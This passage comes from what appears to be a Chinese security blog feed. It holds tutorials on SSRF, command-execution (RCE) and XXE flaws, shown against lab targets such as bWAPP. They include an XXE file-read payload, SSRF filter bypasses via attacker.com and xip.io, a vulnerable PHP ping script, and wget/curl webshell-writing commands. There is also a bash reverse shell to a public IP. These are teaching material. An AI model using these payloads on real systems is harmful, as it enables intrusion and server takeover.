alt="Xnip2020-06-01_20-36-42.jpg"></p><p>得到经过base64编码的数据，我们放到burpsuite中解码</p><p><img src="https://i.loli.net/2020/06/01/svjixt5ZahKIMwN.jpg" alt="Xnip2020-06-01_20-39-57.jpg"></p><p>解码内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heroes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hero</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">login</span>&gt;</span>neo<span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>trinity<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">secret</span>&gt;</span>Oh why didn&#x27;t I took that BLACK pill?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">movie</span>&gt;</span>The Matrix<span class="tag">&lt;/<span class="name">movie</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">genre</span>&gt;</span>action sci-fi<span class="tag">&lt;/<span class="name">genre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">hero</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hero</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">login</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>loveZombies<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">secret</span>&gt;</span>There&#x27;s a cure!<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">movie</span>&gt;</span>Resident Evil<span class="tag">&lt;/<span class="name">movie</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">genre</span>&gt;</span>action horror sci-fi<span class="tag">&lt;/<span class="name">genre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">hero</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hero</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>3<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">login</span>&gt;</span>thor<span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>Asgard<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">secret</span>&gt;</span>Oh, no... this is Earth... isn&#x27;t it?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">movie</span>&gt;</span>Thor<span class="tag">&lt;/<span class="name">movie</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">genre</span>&gt;</span>action sci-fi<span class="tag">&lt;/<span class="name">genre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">hero</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hero</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>4<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">login</span>&gt;</span>wolverine<span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>Log@N<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">secret</span>&gt;</span>What&#x27;s a Magneto?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">movie</span>&gt;</span>X-Men<span class="tag">&lt;/<span class="name">movie</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">genre</span>&gt;</span>action sci-fi<span class="tag">&lt;/<span class="name">genre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">hero</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hero</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>5<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">login</span>&gt;</span>johnny<span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>m3ph1st0ph3l3s<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">secret</span>&gt;</span>I&#x27;m the Ghost Rider!<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">movie</span>&gt;</span>Ghost Rider<span class="tag">&lt;/<span class="name">movie</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">genre</span>&gt;</span>action sci-fi<span class="tag">&lt;/<span class="name">genre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">hero</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hero</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>6<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">login</span>&gt;</span>selene<span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>m00n<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">secret</span>&gt;</span>It wasn&#x27;t the Lycans. It was you.<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">movie</span>&gt;</span>Underworld<span class="tag">&lt;/<span class="name">movie</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">genre</span>&gt;</span>action horror sci-fi<span class="tag">&lt;/<span class="name">genre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">hero</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">heroes</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用file协议获取bWAPP本机的boot.ini的内容获得操作系统版本</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/boot.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/01/OrZ94dYtnBgK8MJ.jpg" alt="Xnip2020-06-01_20-48-47.jpg"></p><p>读取成功。</p><h1 id="0x04SSRF常见的过滤与绕过方法"><a href="#0x04SSRF常见的过滤与绕过方法" class="headerlink" title="0x04SSRF常见的过滤与绕过方法"></a>0x04SSRF常见的过滤与绕过方法</h1><h2 id="过滤方法"><a href="#过滤方法" class="headerlink" title="过滤方法"></a>过滤方法</h2><ul><li>过滤开头不是<a href="http://xxxx.com的所有链接/">http://xxxx.com的所有链接</a></li><li>过滤格式为ip的链接，比如127.0.0.1</li><li>结尾必须是某个文件后缀，比如.jpg</li></ul><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul><li><p>http基础认证：<a href="https://link.jianshu.com/?t=http://xxx.com@attacker.com">http://xxx.com@attacker.com</a></p></li><li><p>利用302跳转（<a href="https://link.jianshu.com/?t=http://xip.io">xip.io</a>，<a href="https://link.jianshu.com/?t=http://www.tinyrul.com">www.tinyrul.com</a>）</p><p>（1）当我们访问xip.io的子域，比如127.0.0.1.xip.io的时候，实际上会被自动重定向到127.0.0.1</p><p>（2）如果利用上面的方法会被检测127.0.0.1的话，可以利用<a href="https://link.jianshu.com/?t=http://www.tinyurl.com">www.tinyurl.com</a>提供的服务来进行绕过</p></li><li><p>加上#或?即可</p></li><li><p>更改其他进制的ip或对ip进行编码</p></li></ul><h1 id="0x05修复方案"><a href="#0x05修复方案" class="headerlink" title="0x05修复方案"></a>0x05修复方案</h1><ul><li>限制协议为HTTP、HTTPS</li><li>不用限制302重定向</li><li>设置URL白名单或者限制内网IP</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01浅谈SSRF&quot;&gt;&lt;a href=&quot;#0x01浅谈SSRF&quot; class=&quot;headerlink&quot; title=&quot;0x01浅谈SSRF&quot;&gt;&lt;/a&gt;0x01浅谈SSRF&lt;/h1&gt;&lt;h2 id=&quot;SSRF的定义&quot;&gt;&lt;a href=&quot;#SSRF的定义&quot; class</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web漏洞" scheme="http://yoursite.com/tags/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="SSRF" scheme="http://yoursite.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>浅谈命令执行漏洞——RCE</title>
    <link href="http://yoursite.com/2020/05/30/rce/"/>
    <id>http://yoursite.com/2020/05/30/rce/</id>
    <published>2020-05-30T02:30:40.000Z</published>
    <updated>2020-05-30T13:24:08.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>程序员使用脚本语言(比如PHP)开发应用程序过程中，脚本语言开发十分快速、简洁，方便，但是也伴随着一些问题。比如说速度慢，或者无法接触系统底层，如果我们开发的应用,特别是企业级的一些应用需要去调用一些外部程序。当应用需要调用一些外部程序时就会用到一些执行系统命令的函数。</p><p>一些WEB程序，比如Zabbix管理系统，会存在对相关服务器进行命令行输入和功能点，这类功能点很有可能存在命令执行漏洞，攻击者可以通过这种功能点反弹shell，获得服务器权限。</p><h1 id="命令执行漏洞介绍"><a href="#命令执行漏洞介绍" class="headerlink" title="命令执行漏洞介绍"></a>命令执行漏洞介绍</h1><h2 id="命令执行漏洞的原理"><a href="#命令执行漏洞的原理" class="headerlink" title="命令执行漏洞的原理"></a>命令执行漏洞的原理</h2><p>WEB程序在调用函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞。</p><h2 id="PHP下命令执行相关函数"><a href="#PHP下命令执行相关函数" class="headerlink" title="PHP下命令执行相关函数"></a>PHP下命令执行相关函数</h2><ul><li>system()</li><li>exec()</li><li>shell_exec()</li><li>passthru()</li><li>popen()</li><li>proc_popen()</li></ul><h2 id="命令执行漏洞的危害"><a href="#命令执行漏洞的危害" class="headerlink" title="命令执行漏洞的危害"></a>命令执行漏洞的危害</h2><ul><li>执行系统命令</li><li>反弹shell，取得服务器权限</li><li>写入危害文件</li></ul><h1 id="命令执行漏洞复现"><a href="#命令执行漏洞复现" class="headerlink" title="命令执行漏洞复现"></a>命令执行漏洞复现</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;Here, please input the IP address!&lt;/p&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;input class=&quot;ipadd&quot; type=&quot;text&quot; name=&quot;ipaddress&quot; /&gt;</span><br><span class="line">        &lt;input class=&quot;sub&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ping&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;ipaddress&#x27;</span>] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment"># code...</span></span><br><span class="line">        $ip = $_POST[<span class="string">&#x27;ipaddress&#x27;</span>];</span><br><span class="line">        $cmd = system(<span class="string">&quot;ping -c 4 $ip&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="命令执行漏洞之windows下利用"><a href="#命令执行漏洞之windows下利用" class="headerlink" title="命令执行漏洞之windows下利用"></a>命令执行漏洞之windows下利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;：&amp;前面的语句为假则直接执行后面的</span><br><span class="line">&amp;&amp;：&amp;&amp;前面的语句为假则直接出错，后面的也不执行</span><br><span class="line">|：直接执行后面的语句</span><br><span class="line">||：前面出错执行后面的</span><br></pre></td></tr></table></figure><h2 id="命令执行漏洞之Linux下利用"><a href="#命令执行漏洞之Linux下利用" class="headerlink" title="命令执行漏洞之Linux下利用"></a>命令执行漏洞之Linux下利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;：前面的执行完毕后执行后面的</span><br><span class="line">|：|是管道符，显示后面的执行结果</span><br><span class="line">||：||当前面的执行出错时执行后面的</span><br><span class="line">&amp;：无论前面语句真假后面的语句都会执行</span><br><span class="line">&amp;&amp;：只有前边的语句为真，才会执行后面的</span><br></pre></td></tr></table></figure><h1 id="命令执行漏洞利用思路"><a href="#命令执行漏洞利用思路" class="headerlink" title="命令执行漏洞利用思路"></a>命令执行漏洞利用思路</h1><ol><li>如果有写权限的话，可以执行pwd得到绝对路径，然后可以写文件：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">• ?cmd&#x3D;echo&quot;&lt;?php phpinfo()?&gt;&quot; &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;info.php</span><br><span class="line">• ?cmd&#x3D;wget -O &#x2F;var&#x2F;www&#x2F;html&#x2F;info.php http:&#x2F;&#x2F;www.xx.com&#x2F;phpinfo.txt</span><br><span class="line">• ?cmd&#x3D;curl http:&#x2F;&#x2F;www.xx.com&#x2F;phpinfo.txt &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;info.php</span><br></pre></td></tr></table></figure><ol start="2"><li>反弹shell：公网服务器执行 nc –lvv 8888</li><li>目标服务器上执行：?cmd= bash -i &gt;&amp; /dev/tcp/211.149.191.5/9999 0&gt;&amp;1</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;程序员使用脚本语言(比如PHP)开发应用程序过程中，脚本语言开发十分快速、简洁，方便，但是也伴随着一些问题。比如说速度慢，或者无法接触系统底</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="web漏洞" scheme="http://yoursite.com/tags/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="命令执行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>浅谈XXE漏洞(一)——有回显的XXE漏洞</title>
    <link href="http://yoursite.com/2020/05/27/xxe/"/>
    <id>http://yoursite.com/2020/05/27/xxe/</id>
    <published>2020-05-27T06:07:32.000Z</published>
    <updated>2020-05-28T08:45:06.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>XXE漏洞全称XML External Entity Injection，是一种近些年出现在OWASP TOP 10中的注入漏洞，它是通过XML外部实体注入的一种攻击方式，是对非安全的外部实体数据进行处理时引发的安全问题。要想搞懂XXE，肯定要先了解XML语法规则和外部实体的定义及调用形式。<font color='red'>另外php版本大于5.4.45的默认不解析外部实体</font></p><h1 id="关于XML和DTD"><a href="#关于XML和DTD" class="headerlink" title="关于XML和DTD"></a>关于XML和DTD</h1><h2 id="什么是DTD和XML"><a href="#什么是DTD和XML" class="headerlink" title="什么是DTD和XML"></a>什么是DTD和XML</h2><p>DTD：DTD全称Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。详细的DTD教程：<a href="https://www.w3school.com.cn/dtd/index.asp">DTD教程</a></p><p>XML:XML 指可扩展标记语言，被设计用来传输和存储数据。详细的XML教程：<a href="https://www.w3school.com.cn/xml/index.asp">XML教程</a></p><h2 id="XML的构成形式"><a href="#XML的构成形式" class="headerlink" title="XML的构成形式"></a>XML的构成形式</h2><ul><li><p>元素：元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>body text in between<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>some message in between<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>HTML中的’br’,’hr’,’img’也是元素的一种</p></li><li><p>属性：属性可提供有关元素的额外信息，比如’img’元素中的’src’属性</p></li><li><p>实体：实体是用来定义普通文本的变量。实体引用是对实体的引用。</p></li><li><p>PCDATA：PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p></li><li><p>CDATA：CDATA 是不会被解析器解析的文本。</p></li></ul><h2 id="DTD文档类型"><a href="#DTD文档类型" class="headerlink" title="DTD文档类型"></a>DTD文档类型</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD即可以在XML文档内声明，也可以从外部引用。</p><h3 id="内部声明"><a href="#内部声明" class="headerlink" title="内部声明"></a>内部声明</h3><p>内部声明的格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span>    比如：<span class="meta">&lt;!DOCTYOE <span class="meta-keyword">test</span> [any]&gt;</span></span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [    //note是根元素</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>    //note是父元素，to,from,heading,body是子元素</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>      (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="外部声明"><a href="#外部声明" class="headerlink" title="外部声明"></a>外部声明</h3><p>外部实体声明的格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;文件名或者URL地址&quot;</span>&gt;</span> 比如：<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ex</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">note.dtd的内容</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。通过<font color='red'>ENTITY声明实体，将值赋值给实体。</font></p><p>实体又分为<font color='red'>一般实体</font>和<font color='red'>参数实体</font></p><ol><li><p>一般实体：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">声明方式：</span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名 <span class="meta-string">&quot;实体值&quot;</span>&gt;</span>    比如：<span class="meta">&lt;!ENTITY <span class="meta-keyword">name</span> <span class="meta-string">&quot;zhangsan&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">引用方式：&amp;+实体名+;</span><br><span class="line"></span><br><span class="line">完整实例：</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">name</span> <span class="meta-string">&quot;zhangsan&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>参数实体：<font color='red'>参数实体只能在DTD中使用</font></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">声明方式：</span><br><span class="line"><span class="meta">&lt;!ENTITY % 实体名 <span class="meta-string">&quot;实体值&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">引用方式：%+实体名+;</span><br><span class="line"></span><br><span class="line">完整实例：</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span 